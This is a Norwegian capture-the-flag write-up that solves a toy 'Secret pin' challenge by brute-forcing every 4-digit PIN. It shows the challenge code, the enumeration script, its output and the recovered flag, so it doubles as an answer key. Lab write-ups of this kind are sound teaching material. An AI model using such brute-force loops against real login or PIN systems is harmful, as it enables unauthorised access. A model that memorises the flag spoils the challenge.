@@ -1,0 +1,41 @@
+Secret pin er en pure brute-force challange der poenget er 
+å lage et script som som går gjennom alle muligheter for en
+4-siffers pinkode.
+
+med oppgaven kommer denne fila:
+
+# This is a bruteforce challange
+secret_pin = open("pin.txt", "r").read()
+
+pin = input("Pincode: ")
+
+if len(pin) == 4:
+    if pin == secret_pin:
+        print("Congrats you solved the challange!")
+        flag = open("flag.txt", "r").read()
+        print(flag)
+
+i fila ser man at koden bruker to filer som er skjult: flag.txt og pin.txt
+
+for å løse den lager man et script lignende dette:
+from itertools import product
+
+nums = "0123456789"
+
+pin_tries = product(nums, repeat=4)
+
+for pin in pin_tries:
+    pin = "".join(pin)
+    print(f"echo {pin} | python secret_pin.py")
+#python secret_pin.py må endres til netcat når man setter den opp riktig
+
+hvis man kjører dette scriptet og legger det til filen result.txt
+hvis man da kjører bash result.txt og legegr det inn i en fil får man ca dette resultatet:
+
+
+Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Congrats you solved the challange!
+CTFkom{N0_y0u_cr4ck3d_my_s3cr4t_p1n}
+
+Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: Pincode: 
+
+og man har flagget :)))
